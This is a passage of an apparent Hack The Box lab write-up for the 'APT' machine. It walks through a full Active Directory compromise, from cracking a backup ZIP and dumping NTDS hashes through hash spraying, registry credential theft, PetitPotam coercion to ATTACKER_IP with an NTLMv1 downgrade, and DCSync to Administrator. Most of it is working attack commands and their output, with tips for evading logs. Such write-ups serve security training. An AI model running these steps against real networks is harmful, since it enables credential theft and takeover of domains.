+# get backup.zip
+</code></pre>
+<hr />
+<h2 id="cracking-the-backup-zip">Cracking the Backup ZIP</h2>
+<p>The ZIP is password-protected. We extract its hash with <code>zip2john</code> and crack it with John the Ripper:</p>
+<pre><code class="language-bash">zip2john backup.zip &gt; backup_hash
+
+cat backup_hash -p
+backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f0&lt;REDACTED_HASH&gt;
+</code></pre>
+<p>After clean the hash we cracking the passwd.</p>
+<pre><code>john backup_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+&lt;REDACTED&gt;   (backup.zip)
+1g 0:00:00:00 DONE (2026-03-31 00:15) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s 123456..dumbo
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>Now we extract it:</p>
+<pre><code class="language-bash">unzip backup.zip
+Archive:  backup.zip
+   creating: Active Directory/
+[backup.zip] Active Directory/ntds.dit password:
+  inflating: Active Directory/ntds.dit
+  inflating: Active Directory/ntds.jfm
+  inflating: registry/SECURITY
+  inflating: registry/SYSTEM
+
+ls Active\ Directory/
+  ntds.dit   ntds.jfm
+
+ls registry/
+  SECURITY   SYSTEM
+</code></pre>
+<p>We have the three files needed to dump the entire domain: <code>ntds.dit</code>, <code>SYSTEM</code>, and <code>SECURITY</code>.</p>
+<hr />
+<h2 id="offline-ntds-dump-with-secretsdumppy">Offline NTDS Dump with secretsdump.py</h2>
+<p>With <code>ntds.dit</code> + <code>SYSTEM</code> + <code>SECURITY</code>, we can extract all domain credentials offline without touching the live DC:</p>
+<pre><code class="language-bash">secretsdump.py -ntds &quot;Active Directory/ntds.dit&quot; -system registry/SYSTEM -security registry/SECURITY LOCAL
+
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
+
+[*] Dumping cached domain logon information (domain/username:hash)
+
+[*] Dumping LSA Secrets
+
+[*] MACHINE.ACCMACHINE.ACC:plain_password_hex:34005b&lt;REDACTED_HASH&gt;
+MACHINE.ACC: aad3b4&lt;REDACTED_HASH&gt;:b30027&lt;REDACTED_HASH&gt;
+[*] DefaultPassword
+(Unknown User):&lt;REDACTED&gt;
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x3e0d78&lt;REDACTED_HASH&gt;
+dpapi_userkey:0xdcde3f&lt;REDACTED_HASH&gt;
+[*] NLKM:734f34&lt;REDACTED_HASH&gt;
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 1733ad&lt;REDACTED_HASH&gt;
+[*] Reading and decrypting hashes from Active Directory/ntds.dit
+
+Administrator:500:aad3b4&lt;REDACTED_HASH&gt;:2b576a&lt;REDACTED_HASH&gt;:::
+Guest:501:aad3b4&lt;REDACTED_HASH&gt;:31d6cf&lt;REDACTED_HASH&gt;:::
+DefaultAccount:503:aad3b4&lt;REDACTED_HASH&gt;:31d6cf&lt;REDACTED_HASH&gt;:::
+APT:1000:aad3b4&lt;REDACTED_HASH&gt;:b30027&lt;REDACTED_HASH&gt;:::
+
+krbtgt:502:aad3b4&lt;REDACTED_HASH&gt;:727919&lt;REDACTED_HASH&gt;:::
+
+jeb.sloan:3200:aad3b4&lt;REDACTED_HASH&gt;:9ea25a&lt;REDACTED_HASH&gt;:::
+&lt;1999 users total&gt;
+</code></pre>
+<p>We found a cleartext password <code>&lt;REDACTED&gt;</code> in the LSA secrets, and 1999 domain user hashes. However, this is a <strong>backup from September 2020</strong> — passwords may have changed since then. We need to figure out which users are still valid.</p>
+<hr />
+<h2 id="user-validation-via-kerbrute">User Validation via Kerbrute</h2>
+<p>We try a password spray with <code>&lt;REDACTED&gt;</code> first,no luck. Since port 88 (Kerberos) is open, we use <code>kerbrute</code> to validate which users from the dump still exist in the domain:</p>
+<pre><code class="language-bash">./kerbrute_linux_amd64 userenum -d htb.local --dc apt6.htb users.txt
+
+[+] VALID USERNAME: Administrator@htb.local
+[+] VALID USERNAME: henry.vinson@htb.local
+Done! Tested 1999 usernames (2 valid) in 1097.224 seconds
+</code></pre>
+<p>Only two valid users: <code>Administrator</code> and <code>henry.vinson</code>. The rest of the accounts from the 2020 backup no longer exist.</p>
+<hr />
+<h2 id="ntlm-hash-spray-against-henryvinson">NTLM Hash Spray Against henry.vinson</h2>
+<p>We find henry.vinson's hash from the dump:</p>
+<pre><code>henry.vinson:3647:aad3b435&lt;REDACTED_HASH&gt;:::
+</code></pre>
+<p>We test it directly, but it fails:</p>
+<pre><code class="language-bash">nxc smb apt6.htb -u 'henry.vinson' -H '&lt;REDACTED_HASH&gt;'
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\henry.vinson:&lt;REDACTED_HASH&gt; STATUS_LOGON_FAILURE
+</code></pre>
+<p>The hash from 2020 is no longer valid. But here's the key insight: maybe henry.vinson is now using a password that matches another user's hash from the old dump. We extract all 1999 NTLM hashes and spray each one against henry.vinson via Kerberos.
+<strong>Technical Note:</strong> We performed the hash spray via Kerberos Pre-Authentication instead of traditional SMB for two reasons: speed and stealth. Kerberos is significantly faster and often generates less noise in event logs (Event ID 4768 for Kerberos vs Event ID 4625 for SMB). Furthermore, it allows us to validate credentials by simply requesting a TGT, without needing to establish a full connection to the file system (SMB shares).</p>
+<p>Wisp me on LinkedIn if you'd like to check out the script or discuss the logic!</p>
+<pre><code class="language-bash">awk -F &quot;:&quot; '/^[a-zA-Z0-9._-]+:[0-9]+:/ {print $4}' secretsdump.txt &gt; hashes_ntlm.txt
+
+python3 spray_henry.py hashes_ntlm.txt
+
+[*] Probando 1999 hashes contra henry.vinson...
+[+] ¡ÉXITO! Hash válido encontrado: &lt;REDACTED_HASH&gt;
+</code></pre>
+<p>Henry is reusing the NTLM hash of another user from the old dump. We now have valid credentials for him.</p>
+<hr />
+<h2 id="remote-registry-access-with-regpy">Remote Registry Access with reg.py</h2>
+<p>Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied, he doesn't have interactive login rights. However, there's another avenue: <strong>Remote Registry via RPC</strong>.</p>
+<p>Windows administrators often forget to restrict Remote Registry access in GPOs, leaving it open as a way to read persistent configuration. If Henry has ever logged into this machine, his registry hive will be mounted under <code>HKU</code>.</p>
+<pre><code class="language-bash">reg.py -hashes :&lt;REDACTED_HASH&gt; htb.local/henry.vinson@apt6.htb query -keyName &quot;HKU&quot;
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+HKU
+HKU\.DEFAULT
+HKU\S-1-5-19
+HKU\S-1-5-20
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105_Classes
+HKU\S-1-5-18
+</code></pre>
+<p>Henry's hive is mounted (<code>S-1-5-21-...-1105</code>). We enumerate the Software keys and find something unusual:</p>
+<pre><code class="language-bash">reg.py -hashes :&lt;REDACTED_HASH&gt; htb.local/henry.vinson@apt6.htb query -keyName &quot;HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software&quot;
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem   ← interesting!
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Microsoft
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Policies
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\RegisteredApplications
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Sysinternals
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\VMware, Inc.
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Wow6432Node
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\Classes
+</code></pre>
+<p>We found a custom application key. Let's read it:</p>
+<pre><code class="language-bash">reg.py -hashes :&lt;REDACTED_HASH&gt; htb.local/henry.vinson@apt6.htb query -keyName &quot;HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem&quot;
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+HKU\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem
+    UserName    REG_SZ   henry.vinson_adm
+    PassWord    REG_SZ   &lt;REDACTED&gt;
+</code></pre>
+<p>The application stored credentials in plaintext in the registry. We have <code>henry.vinson_adm</code>'s password.</p>
+<blockquote>
+<p><strong>Pentest tip:</strong> Whenever you have credentials but no shell, look for persistence and configuration storage: SMB shares, LDAP, and the Windows Registry. Third-party management software like this routinely stores credentials in <code>HKCU\Software\&lt;AppName&gt;</code>.</p>
+</blockquote>
+<hr />
+<h2 id="shell-as-henryvinson_adm-and-user-flag">Shell as henry.vinson_adm and user Flag</h2>
+<pre><code class="language-bash">nxc winrm apt6.htb -u 'henry.vinson_adm' -p '&lt;REDACTED&gt;'
+WINRM       dead:beef::b885:d62a:d679:573f 5985   APT              [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local)
+WINRM       dead:beef::b885:d62a:d679:573f 5985   APT              [+] htb.local\henry.vinson_adm:&lt;REDACTED&gt; (Pwn3d!)
+evil-winrm -i apt6.htb -u 'henry.vinson_adm' -p '&lt;REDACTED&gt;'
+
+
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; type ..\Desktop\user.txt
+&lt;USER_FLAG&gt;
+</code></pre>
+<hr />
+<h2 id="privilege-escalation-ntlmv1-downgrade-attack">Privilege Escalation — NTLMv1 Downgrade Attack</h2>
+<h3 id="finding-the-attack-path-via-powershell-history">Finding the Attack Path via PowerShell History</h3>
+<p>Once I gained a shell as henry.vinson_adm, I started with basic enumeration to understand my environment.</p>
+<pre><code class="language-powershell">Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== =============================================
+htb\henry.vinson_adm S-1-5-21-2993095098-2100462451-206186470-1106
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+henry.vinson             henry.vinson_adm         krbtgt
+</code></pre>
+<p>Before jumping into automated tools like BloodHound, I perform a manual "visual dump" of the user's file structure. Often, administrators leave sensitive information or configuration traces in non standard locations.</p>
+<pre><code class="language-powershell">Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; cmd.exe /c dir /S /A
+ Volume in drive C is System
+ Volume Serial Number is BF99-DE3E
+
+ Directory of C:\Users\henry.vinson_adm
+
+09/24/2020  08:40 AM    &lt;DIR&gt;          .
+09/24/2020  08:40 AM    &lt;DIR&gt;          ..
+09/24/2020  08:40 AM    &lt;DIR&gt;          AppData
+09/24/2020  08:40 AM    &lt;JUNCTION&gt;     Application Data [C:\Users\henry.vinson_adm\AppData\Roaming]
+09/24/2020  09:17 AM    &lt;DIR&gt;          Contacts
+09/24/2020  08:40 AM    &lt;JUNCTION&gt;     Cookies [C:\Users\henry.vinson_adm\AppData\Local\Microsoft\Windows\INetCookies]
+10/23/2020  11:02 AM    &lt;DIR&gt;          Desktop
+10/23/2020  10:39 AM    &lt;DIR&gt;          Documents
+09/24/2020  09:17 AM    &lt;DIR&gt;          Downloads
+09/24/2020  09:17 AM    &lt;DIR&gt;          Favorites
+09/24/2020  09:17 AM    &lt;DIR&gt;          Links
+09/24/2020  08:40 AM    &lt;JUNCTION&gt;     Local Settings [C:\Users\henry.vinson_adm\AppData\Local]
+09/24/2020  09:17 AM    &lt;DIR&gt;          Music
+09/24/2020  08:40 AM    &lt;JUNCTION&gt;     My Documents [C:\Users\henry.vinson_adm\Documents]
+09/24/2020  08:40 AM    &lt;JUNCTION&gt;     NetHood [C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\Network Shortcuts]
+03/31/2026  02:58 AM           262,144 NTUSER.DAT
+
+&lt;SNIP&gt;
+
+ Directory of C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+
+11/10/2020  11:58 AM    &lt;DIR&gt;          .
+11/10/2020  11:58 AM    &lt;DIR&gt;          ..
+11/10/2020  11:58 AM               458 ConsoleHost_history.txt
+               1 File(s)            458 bytes
+
+&lt;SNIP&gt;
+</code></pre>
+<p>While digging through the AppData folder, I found a ConsoleHost_history.txt in the PSReadline directory. This folder stores the history of PowerShell commands executed by the user, which is a common place to find leaked credentials or sensitive configurations.</p>
+<pre><code class="language-powershell">Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot; lmcompatibilitylevel -Type DWORD -Value 2 -Force}
+</code></pre>
+<p>Someone ran this as Administrator. The command sets <code>lmcompatibilitylevel = 2</code>, which <strong>enables NTLMv1</strong> authentication. We verify it's still active:</p>
+<pre><code class="language-powershell">Evil-WinRM* PS C:\Users\henry.vinson_adm&gt; Get-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot; -Name lmcompatibilitylevel
+
+
+lmcompatibilitylevel : 2
+PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
+PSChildName          : Lsa
+PSDrive              : HKLM
+PSProvider           : Microsoft.PowerShell.Core\Registry
+</code></pre>
+<h4 id="why-does-this-matter">Why does this matter?</h4>
+<p>NTLMv1 is architecturally broken. It relies on DES with a 56-bit key, meaning any captured NTLMv1 hash can be cracked in seconds via Rainbow Tables (like ntlmv1.com), regardless of how long or complex the password is. In contrast, NTLMv2 implements proper salted hashing, making it significantly harder to crack and impossible to decrypt using pre-computed tables.
+<strong>The Downgrade Logic:</strong> Setting <code>lmcompatibilitylevel = 2</code> tells Windows to send NTLMv1 responses but still accept NTLMv2 if requested by the server. By using Responder, we act as the "server" in this exchange and specifically request NTLMv1. This forces the client to downgrade its authentication to the weakest level, allowing us to capture a hash that is susceptible to rainbow table attacks.</p>
+<p>With NTLMv1 enabled, the attack chain is:
+1. <strong>PetitPotam</strong> — Coerce the Domain Controller to authenticate to our machine via MS-EFSRPC.
+2. <strong>Responder</strong> — Capture the DC's NTLMv1 authentication response.
+3. <strong>Rainbow tables</strong> — Submit the hash to ntlmv1.com for instant decryption, recovering the machine account password or NT hash.</p>
+<h3 id="step-1-configure-responder-with-a-fixed-challenge">Step 1 — Configure Responder with a Fixed Challenge</h3>
+<p>For the rainbow table attack to work, we need to capture the hash with a <strong>known, fixed challenge</strong>. By default Responder generates a random one per request, which would make rainbow table lookup impossible. We set it to <code>1122334455667788</code> in the config:</p>
+<p><img alt="Responder.conf with Challenge = 1122334455667788" src="../img/APT_0003.png" /></p>
+<h3 id="step-2-force-authentication-with-petitpotam">Step 2 — Force Authentication with PetitPotam</h3>
+<p>PetitPotam abuses the MS-EFSRPC protocol (<code>EfsRpcOpenFileRaw</code>) to make a target Windows machine authenticate against an attacker-controlled server — without needing admin rights in many cases:</p>
+<pre><code class="language-bash">python3 PetitPotam.py -u 'henry.vinson_adm' -p '&lt;REDACTED&gt;' -d 'htb.local' &lt;ATTACKER_IP&gt; apt6.htb
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+
+
+              ___            _        _      _        ___            _           
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
+          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|
+          &quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'
+
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+
+                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:apt6.htb[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+</code></pre>
+<p>In the other terminal:</p>
+<pre><code class="language-bash">sudo responder -I tun0 --lm -v
+
+&lt;SNIP&gt;
+
+[+] Listening for events...
+
+[!] Error starting TCP server on port 53, check permissions or other servers running.
+[SMB] NTLMv1 Client   : 10.129.96.60
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:&lt;REDACTED_HASH&gt;
+</code></pre>
+<h3 id="step-3-crack-with-rainbow-tables">Step 3 — Crack with Rainbow Tables</h3>
+<p>We tried <code>hashcat</code> with rockyou.txt first and it exhausted the wordlist without success. Machine account passwords are random and complex by design.</p>
+<p>Instead, we use <a href="https://ntlmv1.com/">ntlmv1.com</a>. Since we used the fixed challenge <code>1122334455667788</code>, the site can look up the NT hash directly from precomputed rainbow tables. We submit the <code>NTLMResponse</code> portion and select <code>Net-NTLMv1</code>:</p>
+<p><img alt="ntlmv1.com with the hash loaded and Net-NTLMv1 selected" src="../img/APT_0004.png" /></p>
+<p>The result comes back instantly in the Tasks tab:</p>
+<p><img alt="ntlmv1.com Tasks showing the cracked NT hash of APT$" src="../img/APT_0005.png" /></p>
+<p>The <strong>NT hash of the <code>APT$</code> machine account</strong> is <code>&lt;REDACTED_HASH&gt;</code>.</p>
+<hr />
+<h2 id="dcsync-as-apt-administrator-hash">DCSync as APT$ — Administrator Hash</h2>
+<p>Machine accounts in AD have replication privileges. We use <code>APT$</code>'s NT hash to perform a <strong>DCSync</strong> and pull the Administrator's credentials directly:</p>
+<pre><code class="language-bash">secretsdump.py 'htb.local/APT$@apt6.htb' -hashes :&lt;REDACTED_HASH&gt; -just-dc-user Administrator
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED_HASH&gt;:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:&lt;REDACTED_HASH&gt;
+Administrator:aes128-cts-hmac-sha1-96:&lt;REDACTED_HASH&gt;
+Administrator:des-cbc-md5:&lt;REDACTED_HASH&gt;
+[*] Cleaning up...
+</code></pre>
+<hr />
+<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag</h2>
+<pre><code class="language-bash">evil-winrm -i apt6.htb -u Administrator -H &lt;REDACTED_HASH&gt;
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ..\Desktop\root.txt
+&lt;ROOT_FLAG&gt;
+</code></pre>
+<p>Rooted!</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": [], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
